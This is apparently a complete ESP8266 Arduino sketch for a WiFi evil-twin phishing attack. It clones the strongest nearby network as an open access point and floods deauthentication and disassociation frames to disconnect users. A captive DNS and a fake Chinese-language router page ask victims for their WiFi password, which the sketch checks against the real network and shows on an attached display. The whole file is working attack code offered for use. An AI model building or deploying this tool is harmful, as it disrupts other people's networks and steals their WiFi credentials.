
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <Wire.h>  // Only needed for Arduino 1.6.5 and earlier
#include "SSD1306.h" // alias for `#include "SSD1306Wire.h"`

extern "C" {
#include "user_interface.h"
}

DNSServer dnsServer;
const byte DNS_PORT = 53;
IPAddress apIP(172, 217, 28, 1);
ESP8266WebServer webServer(80);

SSD1306Wire display(0x3c, D1, D2);
String displayTitle = "WIFI Tools by jky88:";
String displayAP = "";
String displayPWD = "";
String displayMSG = "";

/*=====================================================================*/
int counter = 1;
void drawProgressBarDemo() {
  int progress = (counter / 5) % 100;
  display.drawProgressBar(0, 32, 120, 10, progress);
  display.setTextAlignment(TEXT_ALIGN_CENTER);
  display.drawString(64, 15, String(progress) + "%");
  counter++;
}

/*=====================================================================*/
bool isAttacking = false;
uint8_t deauthPacket[26] = {
  /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
  /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
  /*  4 - 9  */ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,//reciever (target)
  /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //source (ap)
  /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //BSSID (ap)
  /* 22 - 23 */ 0x00, 0x00, //fragment & squence number
  /* 24 - 25 */ 0x01, 0x00 //reason code (1 = unspecified reason)
};
uint8_t apMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
uint8_t clientMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
/*-------------------------------------------------------------------*/
void sendDeauth(uint8_t type) {
  uint8_t packet[128];
  int packetSize = 0;
  for (int i = 0; i < sizeof(deauthPacket); i++) {
    packet[i] = deauthPacket[i];
    packetSize++;
  }
  for (int i = 0; i < 6; i++) {
    packet[4 + i] = clientMac[i];           //set target (client)
    packet[10 + i] = packet[16 + i] = apMac[i]; //set source (AP)
  }
  packet[0] = type; packet[24] = 0x01;
  if (wifi_send_pkt_freedom(packet, packetSize, 0) == -1) {
    Serial.print("-");
  } else {
    Serial.print("+");
  }
  delay(2); //less packets are beeing dropped
}

/*=====================================================================*/
#define maxResults 5
uint8_t apScanMac[maxResults][6];
int apChannels[maxResults];
int rssi[maxResults];
char apNames[maxResults][33];
int encryption[maxResults];
bool hidden[maxResults];
int maxRssi = -1;
/*---------------------------------------*/
bool apScan() {
  int rssi_num = -1000;
  int results = 0;
  //-->(async = false & show_hidden = true)
  results = WiFi.scanNetworks(false, true);
  for (int i = 0; i < results && i < maxResults; i++) {
    Serial.println(">AP: " + WiFi.SSID(i));
    for (int j = 0; j < 6; j++) apScanMac[i][j] = WiFi.BSSID(i)[j];
    apChannels[i] = WiFi.channel(i);
    rssi[i] = WiFi.RSSI(i);
    String _ssid = WiFi.SSID(i);
    _ssid.replace("\"", "\\\"");
    _ssid.toCharArray(apNames[i], 33);
    encryption[i] = WiFi.encryptionType(i);
    hidden[i] = WiFi.isHidden(i);
    if (rssi[i] > rssi_num) {
      maxRssi = i;
      rssi_num = rssi[i];
    }
  }
  if (results == 0) return false;
  if (maxRssi == -1) return false;
  return true;
}

/*=====================================================================*/
const String postForms = "<html><head><title>Router</title></head><body>\
    <div align=\"center\" style=\"padding-top:20%\">\
    <p><B>&#x4E3A;&#x4E86;&#x4FDD;&#x969C;&#x60A8;&#x7684;\
    &#x7F51;&#x7EDC;&#x5B89;&#x5168;&#xFF0C;&#x8BF7;&#x91CD;\
    &#x65B0;&#x786E;&#x8BA4;WIFI&#x5BC6;&#x7801;!</B></p><br/>\
    <form method=\"post\" action=\"/postform/\"><label>WiFi&#x5BC6;&#x7801;:</label>\
    <input type=\"text\" name=\"pwd\" placeholder=&#x8BF7;&#x8F93;&#x5165;&#x5BC6;&#x7801;>\
    <br/><br/><input type=\"submit\" value=&#x786E;&#x5B9A; style=\"width:250px;height:30px\">\
    <br/><br/></form></div></body></html>";
/*---------------------------------------------------------------------*/
void handleRoot() {
  webServer.send(200, "text/html", postForms);
}
/*---------------------------------------*/
void handleForm() {
  if (webServer.method() != HTTP_POST) {
    webServer.send(405, "text/plain", "Method Not Allowed");
  } else {
    if (webServer.hasArg("pwd")) {
      webServer.send(200, "text/json", "true" );
      isAttacking = false;
      WiFi.mode(WIFI_STA);
      WiFi.begin((const char*)apNames[maxRssi], (const char*)webServer.arg("pwd").c_str());
      displayAP = apNames[maxRssi];
      displayPWD = webServer.arg("pwd");
      int count = 0;
      while (WiFi.status() != WL_CONNECTED && count < 10) {
        delay(1000);
        count++;
      }
      if (count >= 10) {
        WiFi.mode(WIFI_AP);
        WiFi.softAP((const char*)apNames[maxRssi], (const char*)"", apChannels[maxRssi]);
        isAttacking = true;
        displayMSG = "pwd is not ok!!!";
      } else {
        Serial.println("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
        Serial.println(apNames[maxRssi] + String("==>>") + webServer.arg("pwd"));
        displayMSG = "pwd is ok!!!";
      }
    } else webServer.send(200, "text/json", "false");
  }
}

/*=============setup==============*/
void setup() {
  Serial.begin(115200);
  display.init();
  display.flipScreenVertically();
  display.setFont(ArialMT_Plain_10);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("meiyouzhaodaowifi");
  displayAP = "meiyouzhaodaowifi";
  if (apScan()) {
    WiFi.softAP((const char*)apNames[maxRssi], (const char*)"", apChannels[maxRssi]);
    isAttacking = true;
    displayAP = String(apNames[maxRssi]);
  }

  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.on("/", handleRoot);
  webServer.on("/postform/", handleForm);
  webServer.onNotFound(handleRoot);
  webServer.begin();
}

/*=============loop==============*/
void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  /*----------------------deauther-----------------------*/
  if (isAttacking) {
    Serial.println();
    displayMSG = "isAttacking";
    for (int i = 0; i < 10; i++) {
      //-----------------------------
      for (int j = 0; j < 6; j++) {
        apMac[j] = apScanMac[maxRssi][j];
        clientMac[j] = 0xFF;
      }
      sendDeauth(0xc0);
      sendDeauth(0xa0);
      //-----------------------------
      for (int j = 0; j < 6; j++) {
        apMac[j] = 0xFF;
        clientMac[j] = apScanMac[maxRssi][j];
      }
      sendDeauth(0xc0);
      sendDeauth(0xa0);
      Serial.print("*");
      delay(30);
    }
  }

  display.clear();
  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.drawString(10, 2, String(millis()));
  display.drawString(10, 14, displayTitle);
  display.drawString(10, 26, displayAP);
  display.drawString(10, 38, displayPWD);
  display.drawString(10, 50, displayMSG);
  display.display();
  delay(10);
}
